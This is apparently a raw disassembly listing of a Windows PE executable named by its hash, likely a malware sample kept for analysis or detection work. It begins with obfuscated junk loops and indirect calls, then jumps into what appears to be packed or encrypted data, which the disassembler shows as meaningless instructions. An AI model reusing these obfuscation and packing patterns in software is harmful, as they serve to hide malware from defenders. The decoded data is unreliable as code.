
6729e452ed91227d1c3ccfc597a6b308df52f209e60ad1dc3fba84c49f59a1c8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	bound  edx,QWORD PTR [ecx+ebp*2+0x70707041]
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    eax,DWORD PTR [eax]
  40130c:	scas   al,BYTE PTR es:[edi]
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	cld    
  4013a8:	es mov edx,0xeecabc19
  4013ae:	fcomp  QWORD PTR [eax+0x712d7f36]
  4013b4:	jle    0x401416
  4013b6:	push   0xffffffe6
  4013b8:	sub    cl,BYTE PTR [esi+ebx*1+0x3c]
  4013bc:	pop    ecx
  4013bd:	add    DWORD PTR es:[edx+0x52],eax
  4013c1:	mov    dh,0x13
  4013c3:	xor    BYTE PTR [edx+0x319d967],0xae
  4013ca:	jmp    0x4013fc
  4013cc:	fxch   st(1)
  4013ce:	xor    dh,BYTE PTR [eax+ebp*2+0x1b]
  4013d2:	es inc eax
  4013d4:	test   DWORD PTR [edi+0x60],esi
  4013d7:	mov    DWORD PTR [ebx],ebx
  4013d9:	mov    ch,0xa7
  4013db:	add    bh,ah
  4013dd:	dec    ebp
  4013de:	lea    esp,[ebx+eiz*8+0x4c7d3789]
  4013e5:	icebp  
  4013e6:	(bad)  
  4013e7:	jb     0x4013e0
  4013e9:	arpl   di,si
  4013eb:	in     eax,0x9e
  4013ed:	jo     0x401383
  4013ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013f1:	daa    
  4013f2:	out    0xd9,eax
  4013f4:	out    0xef,eax
  4013f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f7:	dec    ecx
  4013f8:	fistp  DWORD PTR [ebp-0x1b9ae8f4]
  4013fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013ff:	inc    ebx
  401400:	jge    0x4013c1
  401402:	inc    esi
  401403:	ins    BYTE PTR es:[edi],dx
  401404:	adc    bl,BYTE PTR [edx+eax*4-0x52]
  401408:	in     al,dx
  401409:	jge    0x40147c
  40140b:	or     BYTE PTR [ebp-0x4ea5432a],ah
  401411:	sub    eax,0x981147b3
  401416:	(bad)  
  401418:	leave  
  401419:	sub    al,0x55
  40141b:	cwde   
  40141c:	ins    BYTE PTR es:[edi],dx
  40141d:	fldenv [ebp+0x25]
  401420:	stc    
  401421:	sahf   
  401422:	pusha  
  401423:	stos   BYTE PTR es:[edi],al
  401424:	push   edi
  401425:	es (bad) 
  401427:	pop    es
  401428:	cli    
  401429:	sbb    BYTE PTR [edi+0x1e],ch
  40142c:	lea    esp,[edi+0x40]
  40142f:	js     0x40140f
  401431:	adc    eax,0x96ed37f0
  401436:	scas   eax,DWORD PTR es:[edi]
  401437:	test   al,0x73
  401439:	jbe    0x40144b
  40143b:	dec    eax
  40143c:	jae    0x401430
  40143e:	xchg   esi,eax
  40143f:	adc    ecx,esp
  401441:	xchg   edx,eax
  401442:	call   0xef0b:0x434fd698
  401449:	add    BYTE PTR [ecx-0x50db04b6],0x64
  401450:	mov    ds:0x50f96747,al
  401455:	mov    al,0xa3
  401457:	sti    
  401458:	popf   
  401459:	push   esp
  40145a:	in     al,0xb8
  40145c:	cmp    eax,0x1d0fe49c
  401461:	pop    ecx
  401462:	(bad)  
  401463:	into   
  401464:	mov    cl,0x9d
  401466:	sbb    BYTE PTR [eax],dl
  401468:	stc    
  401469:	loope  0x401434
  40146b:	dec    eax
  40146c:	dec    esi
  40146d:	sub    DWORD PTR [ebx+0x71d79e2],ebx
  401473:	gs repz scas al,BYTE PTR es:[edi]
  401476:	add    edi,DWORD PTR [edi-0x49]
  401479:	test   BYTE PTR [esp+ecx*4+0x43],dl
  40147d:	push   ecx
  40147e:	push   0x77
  401480:	fs push ecx
  401482:	mov    al,0x6b
  401484:	cs pusha 
  401486:	jns    0x4014a5
  401488:	mov    cl,0x7e
  40148a:	retf   
  40148b:	and    al,0xcb
  40148d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40148e:	enter  0xef26,0xa3
  401492:	mov    ebx,0xbfb7c011
  401497:	imul   ebx,DWORD PTR [edx+0x174484f9],0x7ac16e37
  4014a1:	clc    
  4014a2:	mov    eax,0x8d3cf5d5
  4014a7:	in     al,dx
  4014a8:	mov    ah,0x36
  4014aa:	inc    ecx
  4014ab:	or     BYTE PTR gs:[edx-0x1d],cl
  4014af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014b0:	jl     0x401433
  4014b2:	or     edx,DWORD PTR [ebp-0x21]
  4014b5:	add    al,0x4f
  4014b7:	repz pop ds
  4014b9:	and    DWORD PTR [ebx+0x8],0x3260ba3b
  4014c0:	add    bh,BYTE PTR [edi-0x7a]
  4014c3:	jmp    0xdf7d0dd9
  4014c8:	fisttp DWORD PTR [edx+0x2a74f71b]
  4014ce:	cs mov esi,0x25f0e436
  4014d4:	push   esp
  4014d5:	pop    ecx
  4014d6:	fdivr  QWORD PTR [ecx]
  4014d8:	jmp    0x401532
  4014da:	cdq    
  4014db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014dc:	inc    ecx
  4014dd:	repnz gs cld 
  4014e0:	(bad)  
  4014e1:	test   DWORD PTR ds:0x9a28795f,0x30eebee3
  4014eb:	cli    
  4014ec:	mov    eax,ds:0xdd4224f9
  4014f1:	cli    
  4014f2:	lods   eax,DWORD PTR ds:[esi]
  4014f3:	and    eax,DWORD PTR [ebx+ebx*8+0x546a38c1]
  4014fa:	das    
  4014fb:	(bad)  
  4014fc:	popa   
  4014fd:	xor    edi,eax
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx+0x47ff1fed]
  401516:	push   esi
  401517:	mov    eax,0x70707e70
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	fdivp  st(6),st
  401522:	mov    DWORD PTR [eax-0x5d],ebx
  401525:	cmp    ebp,DWORD PTR [ebp+edi*4-0x3d]
  401529:	out    dx,eax
  40152a:	mov    dh,0x9f
  40152c:	clc    
  40152d:	test   al,0xde
  40152f:	imul   ecx,DWORD PTR [edx-0x6940228d],0xa1fc8f8c
  401539:	push   ds
  40153a:	cdq    
  40153b:	jmp    0x34d3:0xa4dfc442
  401542:	mov    al,0x2f
  401544:	(bad)  
  401546:	in     al,0x75
  401548:	jns    0x40150e
  40154a:	xchg   ch,dh
  40154c:	adc    eax,0x6e254022
  401551:	cmp    ebp,DWORD PTR [esi+edi*1+0x51da9e44]
  401558:	jnp    0x40157c
  40155a:	mov    eax,ds:0x1e06b577
  40155f:	push   ecx
  401561:	rcl    BYTE PTR [edi-0x4d97f3af],1
  401567:	xchg   ebx,eax
  401568:	loopne 0x40155b
  40156a:	(bad)  
  40156b:	cwde   
  40156c:	sbb    DWORD PTR [ebp+0x6d],edx
  40156f:	pop    ebp
  401570:	push   es
  401571:	(bad)  
  401572:	jge    0x401566
  401574:	(bad)  
  401575:	bound  ecx,QWORD PTR ds:0x8077471d
  40157b:	inc    esp
  40157c:	inc    esi
  40157d:	aaa    
  40157e:	jg     0x401527
  401580:	ins    DWORD PTR es:[edi],dx
  401581:	fs popf 
  401583:	or     eax,0x4aa6ac37
  401588:	fs jp  0x4015cc
  40158b:	pop    edx
  40158c:	inc    esp
  40158d:	in     al,dx
  40158e:	inc    ecx
  40158f:	mov    edi,0x5a19dd8f
  401594:	sub    esp,ebx
  401596:	js     0x40156f
  401598:	icebp  
  401599:	sub    BYTE PTR [esi],dh
  40159b:	push   eax
  40159c:	jns    0x401608
  40159e:	jmp    0xd45230b5
  4015a3:	ret    
  4015a4:	dec    ebx
  4015a5:	out    0xe6,al
  4015a7:	or     ebx,DWORD PTR [ebp-0x62b35a0f]
  4015ad:	mov    al,0x86
  4015af:	sbb    eax,0xc62bc7e5
  4015b4:	in     al,0x3e
  4015b6:	popf   
  4015b7:	pop    esi
  4015b8:	or     eax,0xac44aa9c
  4015bd:	call   0x25cb:0xd1c841ad
  4015c4:	dec    edx
  4015c5:	jae    0x401551
  4015c7:	stos   BYTE PTR es:[edi],al
  4015c8:	jmp    0xe0ceaa41
  4015cd:	mov    eax,ds:0xbbf98024
  4015d2:	int3   
  4015d3:	je     0x401635
  4015d5:	nop
  4015d6:	inc    edx
  4015d7:	cmc    
  4015d8:	arpl   WORD PTR [esp+eax*4+0x73],bp
  4015dc:	and    DWORD PTR [ecx+0x3cd32c8],edx
  4015e2:	rcr    BYTE PTR [eax-0xdba6c1f],0xf3
  4015e9:	mov    ebp,0x37aaee35
  4015ee:	inc    eax
  4015ef:	test   BYTE PTR [ebp+0x18],dh
  4015f2:	push   ebx
  4015f3:	push   0x38
  4015f5:	inc    ecx
  4015f6:	popf   
  4015f7:	inc    ecx
  4015f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015f9:	lahf   
  4015fa:	and    BYTE PTR [bp+di+0x73],ch
  4015fe:	or     BYTE PTR [edx],dh
  401600:	aad    0xd7
  401602:	data16 shl BYTE PTR [ebx],0xe
  401606:	add    DWORD PTR [ecx-0x8],ecx
  401609:	push   edx
  40160a:	and    ah,0x78
  40160d:	sar    edx,cl
  40160f:	push   ebx
  401610:	or     al,0x1e
  401612:	dec    ecx
  401613:	mov    ch,0x3f
  401615:	mov    ?,WORD PTR [eax-0x6d]
  401618:	sbb    al,0xc6
  40161a:	mov    edx,edx
  40161c:	mov    eax,ds:0x8906eefe
  401621:	dec    esp
  401622:	hlt    
  401623:	cmp    ebx,DWORD PTR [ebp+0x27b551b1]
  401629:	push   sp
  40162b:	stc    
  40162c:	icebp  
  40162d:	jo     0x40165c
  40162f:	das    
  401630:	inc    esi
  401631:	jno    0x4015e5
  401633:	popf   
  401634:	fcmovb st,st(4)
  401636:	dec    edx
  401637:	xchg   edi,eax
  401638:	cli    
  401639:	sub    edx,ecx
  40163b:	sbb    eax,0x793d75e6
  401640:	pop    esp
  401641:	das    
  401642:	push   edi
  401643:	xlat   BYTE PTR ds:[ebx]
  401644:	inc    ebp
  401645:	push   ds
  401646:	into   
  401647:	and    DWORD PTR [ecx],0xffffffa2
  40164a:	scas   eax,DWORD PTR es:[edi]
  40164b:	addr16 lahf 
  40164d:	neg    bl
  40164f:	repz fs pop edi
  401652:	iret   
  401653:	(bad)
  401658:	adc    al,BYTE PTR [edx]
  40165a:	test   eax,0x6bfa8d66
  40165f:	ret    0xcffd
  401662:	xchg   ebx,eax
  401663:	mov    ah,BYTE PTR [ebp+0x7461684d]
  401669:	in     eax,0xa7
  40166b:	pop    esi
  40166c:	pop    ds
  40166d:	cwde   
  40166e:	pop    ss
  40166f:	repnz push ss
  401671:	je     0x4016d6
  401673:	inc    edx
  401674:	push   ebp
  401675:	aaa    
  401676:	(bad)  
  401677:	dec    ebx
  401678:	push   es
  401679:	inc    ebp
  40167a:	xchg   ebx,eax
  40167b:	sti    
  40167c:	mov    eax,ds:0x10ed56ab
  401681:	rcr    BYTE PTR [eax+0x3c52f988],0x5a
  401688:	(bad)  
  401689:	adc    ecx,ecx
  40168b:	or     eax,DWORD PTR [ecx]
  40168d:	dec    esi
  40168e:	cmp    al,0xa7
  401690:	pushf  
  401691:	push   edx
  401692:	(bad)  [ecx]
  401694:	add    BYTE PTR [ecx+ebx*1],0x55
  401698:	loope  0x401658
  40169a:	clc    
  40169b:	push   ds
  40169c:	mul    BYTE PTR [edx+0x59]
  40169f:	in     eax,0xb7
  4016a1:	mov    ebp,0x5a65162b
  4016a6:	cwde   
  4016a7:	mov    ebx,0x6ae85959
  4016ac:	adc    DWORD PTR [esi],0x1b6d1d36
  4016b2:	cli    
  4016b3:	(bad)  
  4016b5:	sbb    ah,bh
  4016b7:	add    esp,DWORD PTR [edx+0x14bc6040]
  4016bd:	pop    ds
  4016be:	jl     0x401678
  4016c0:	daa    
  4016c1:	ror    BYTE PTR ds:0x6d2f3c22,0x85
  4016c8:	and    al,0xb6
  4016ca:	push   ds
  4016cb:	jge    0x401741
  4016cd:	sbb    esi,eax
  4016cf:	nop
  4016d0:	cmp    edx,DWORD PTR [edi-0x4f]
  4016d3:	mov    ecx,0x28d943c4
  4016d8:	dec    ecx
  4016d9:	xchg   ecx,eax
  4016da:	jle    0x4016fe
  4016dc:	mov    ds:0x9aa56cf1,eax
  4016e1:	sbb    al,0xcd
  4016e3:	repz lea ebp,[ecx-0x4c509c40]
  4016ea:	pop    edx
  4016eb:	mov    dh,0x17
  4016ed:	push   esp
  4016ee:	popf   
  4016ef:	imul   esp,DWORD PTR ds:0xcf49759d,0x2
  4016f6:	stos   DWORD PTR es:[edi],eax
  4016f7:	dec    eax
  4016f8:	mov    bh,0xa3
  4016fa:	cs popf 
  4016fc:	mov    ebp,DWORD PTR [ebx-0x6dc2674b]
  401702:	pop    eax
  401703:	dec    edi
  401704:	jl     0x401703
  401706:	out    dx,eax
  401707:	cwde   
  401708:	or     BYTE PTR [esi+0x36e18931],dl
  40170e:	cmp    ah,ch
  401710:	sti    
  401711:	rol    ah,0x82
  401714:	add    dl,ch
  401716:	rcl    DWORD PTR [esi+0x7e5b9b6],1
  40171c:	adc    DWORD PTR [esi+0x458de70c],ebp
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	and    DWORD PTR [ecx-0x67],edx
  401743:	aam    0x70
  401745:	jl     0x4017b7
  401747:	jo     0x4017b9
  401749:	jle    0x4017bb
  40174b:	jo     0x401779
  40174d:	jmp    0x4017a8
  40174f:	rcl    BYTE PTR [ebx+0x22971c92],0xec
  401756:	add    al,0xf1
  401758:	repz test DWORD PTR [ebp+0x4],ebp
  40175c:	push   ss
  40175d:	mov    eax,ds:0x9ce2da60
  401762:	add    BYTE PTR [esi],ah
  401764:	lahf   
  401765:	and    BYTE PTR [eax+0x4eada1a3],cl
  40176b:	imul   edx,DWORD PTR [edx-0x22515a71],0xfe995bf0
  401775:	sbb    ch,BYTE PTR [edx-0x6fcb2a41]
  40177b:	ret    0xd276
  40177e:	gs nop
  401780:	mov    al,ds:0xb5b45a17
  401785:	mov    dl,0x9
  401787:	pusha  
  401788:	aad    0x17
  40178a:	shr    dh,cl
  40178c:	mov    eax,0x7eb946f0
  401791:	addr16 xchg ebx,eax
  401793:	aad    0xb7
  401795:	mov    esp,0x4651c9ed
  40179a:	sti    
  40179b:	shl    DWORD PTR [eax+0x17],cl
  40179e:	out    0xa7,eax
  4017a0:	mov    ebp,0xc781ab2d
  4017a5:	in     al,dx
  4017a6:	call   0xb79780c1
  4017ab:	push   0xffffffba
  4017ad:	jmp    0x40179a
  4017af:	fistp  QWORD PTR ds:0xda4b06e5
  4017b5:	pop    edi
  4017b6:	adc    al,0x6c
  4017b8:	and    BYTE PTR [eax+0x604816b8],bh
  4017be:	inc    edi
  4017bf:	mov    bh,0x9b
  4017c1:	jno    0x401823
  4017c3:	cld    
  4017c4:	das    
  4017c5:	icebp  
  4017c6:	sbb    eax,0x26b55560
  4017cb:	(bad)  
  4017cd:	dec    eax
  4017ce:	cmp    DWORD PTR [edx],ebx
  4017d0:	pop    ebx
  4017d1:	ins    BYTE PTR es:[edi],dx
  4017d2:	arpl   WORD PTR [ebx],bp
  4017d4:	mov    edi,0xe358a59d
  4017d9:	mov    edi,0x2d598cd8
  4017de:	xchg   edi,eax
  4017df:	jp     0x4017cd
  4017e1:	jns    0x4017c9
  4017e3:	or     DWORD PTR [edx+0x3a39bcc1],ebp
  4017e9:	xchg   DWORD PTR [edx+0x2388acf5],edi
  4017ef:	cmovno ecx,DWORD PTR [edi]
  4017f2:	sbb    dl,al
  4017f4:	sar    BYTE PTR [ebx],cl
  4017f6:	sbb    eax,0xc66da255
  4017fb:	add    eax,0xfa247682
  401800:	daa    
  401801:	fidiv  DWORD PTR [ebx+esi*4-0x46]
  401805:	outs   dx,BYTE PTR ds:[esi]
  401806:	or     al,0x71
  401808:	push   ebp
  401809:	enter  0xc7c6,0xa6
  40180d:	loope  0x4017d9
  40180f:	jmp    0x4017f6
  401811:	pop    eax
  401812:	dec    esi
  401813:	pop    es
  401814:	stos   DWORD PTR es:[edi],eax
  401815:	mov    bh,0xbc
  401817:	mov    edx,0xad1752a9
  40181c:	mov    edi,DWORD PTR [ecx+0x219dab20]
  401822:	mov    al,0x4a
  401824:	(bad)  
  401825:	jo     0x40180b
  401827:	mov    esp,0x3853f5e0
  40182c:	inc    edi
  40182d:	adc    BYTE PTR [eax],bh
  40182f:	or     eax,0x33affd04
  401834:	mov    eax,ds:0x3c71716a
  401839:	cli    
  40183a:	test   eax,0x6571cb22
  40183f:	and    eax,0x23e8c05a
  401844:	cmp    dh,al
  401846:	jae    0x4017dd
  401848:	xchg   edi,eax
  401849:	adc    eax,0x3c5d8d4f
  40184e:	xor    eax,0x6225051a
  401853:	rol    BYTE PTR [eax],cl
  401855:	in     eax,0x22
  401857:	or     DWORD PTR [ecx+ebx*2],ecx
  40185a:	jmp    0x4797:0xde37da3b
  401861:	stos   BYTE PTR es:[edi],al
  401862:	stos   DWORD PTR es:[edi],eax
  401863:	pop    edi
  401864:	leave  
  401865:	std    
  401866:	stos   BYTE PTR es:[edi],al
  401867:	sbb    al,0x45
  401869:	mov    ds:0xfe0f5196,al
  40186e:	jl     0x401885
  401870:	fs pop es
  401872:	adc    DWORD PTR [ebx],edx
  401874:	mov    al,ah
  401876:	pop    ds
  401877:	cmp    cl,BYTE PTR [edi+0x1e56f8ee]
  40187d:	(bad)
  401880:	(bad)  
  401881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401882:	cmp    al,0xa6
  401884:	add    esi,DWORD PTR [edi+ebx*8]
  401887:	popa   
  401888:	cmp    esp,esi
  40188a:	mov    bl,0x95
  40188c:	dec    esp
  40188d:	mov    edi,0xa30d4e4
  401892:	out    dx,al
  401893:	jno    0x40181c
  401895:	pop    ds
  401896:	and    DWORD PTR [ecx+0x68d4153e],eax
  40189c:	daa    
  40189d:	pop    esp
  40189e:	push   edi
  40189f:	pusha  
  4018a0:	add    eax,0x536ed0e2
  4018a5:	aas    
  4018a6:	retf   0x1a4f
  4018a9:	pop    edx
  4018aa:	pop    ebx
  4018ab:	nop
  4018ac:	fwait
  4018ad:	pop    edi
  4018ae:	ret    
  4018af:	int3   
  4018b0:	ret    
  4018b1:	inc    ebp
  4018b2:	sub    BYTE PTR [edi+0x4ae76e82],al
  4018b8:	jnp    0x40188b
  4018ba:	lds    edx,FWORD PTR [esp+eiz*2-0x1d]
  4018be:	pop    ebp
  4018bf:	test   edi,ebx
  4018c1:	xchg   ebx,eax
  4018c2:	inc    esp
  4018c3:	(bad)  
  4018c4:	sub    ch,ah
  4018c6:	xor    edi,0x98d8d439
  4018cc:	mov    edi,0xa1ab5dcf
  4018d1:	imul   esp,eax,0xb3363c70
  4018d7:	call   0xe4a2a548
  4018dc:	push   es
  4018dd:	in     eax,0x40
  4018df:	stos   DWORD PTR es:[edi],eax
  4018e0:	xor    dh,BYTE PTR [eax]
  4018e2:	call   0x5731:0x8a249f01
  4018e9:	fist   WORD PTR [edi]
  4018eb:	out    0x11,eax
  4018ed:	sub    eax,DWORD PTR [esi+eiz*2+0x25]
  4018f1:	paddw  mm5,QWORD PTR [eax-0x49663490]
  4018f8:	xchg   edx,eax
  4018f9:	pop    es
  4018fa:	clc    
  4018fb:	add    al,0xd7
  4018fd:	add    bl,dh
  4018ff:	out    0xb9,al
  401901:	inc    ebp
  401902:	int3   
  401903:	cs xor eax,0xa22e32fa
  401909:	mov    ebp,esi
  40190b:	out    dx,eax
  40190c:	mov    BYTE PTR [edx-0x19560d23],dl
  401912:	jo     0x4018f3
  401914:	sub    al,0x4d
  401916:	aad    0x8e
  401918:	and    al,0x67
  40191a:	mov    edi,0x1b31476
  40191f:	aam    0x5f
  401921:	inc    ebp
  401922:	fistp  WORD PTR [bx+si+0x2b]
  401926:	lods   al,BYTE PTR ds:[esi]
  401927:	out    0xf1,al
  401929:	neg    ebp
  40192b:	les    ebp,FWORD PTR [esi-0x28]
  40192e:	pop    es
  40192f:	add    al,0x20
